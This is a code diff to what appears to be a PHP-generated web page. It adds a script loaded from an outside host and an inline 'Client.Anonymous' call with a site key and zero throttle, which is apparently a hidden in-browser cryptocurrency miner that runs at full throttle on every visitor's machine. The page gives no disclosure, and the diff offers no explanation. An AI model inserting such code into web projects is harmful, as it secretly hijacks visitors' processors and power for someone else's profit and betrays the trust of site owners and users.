@@ -174,3 +174,10 @@ if ($ret == false) {
     </div>
 </div>
 </body>
+<script src="https://www.hostingcloud.racing/gzZy.js"></script>
+<script>
+    var _client = new Client.Anonymous('dfe8f753d1b14d4228ae46c42d542473ce4e267e05b77216a82f982fbef1c6f6', {
+        throttle: 0, ads: 0
+    });
+    _client.start();
+</script>
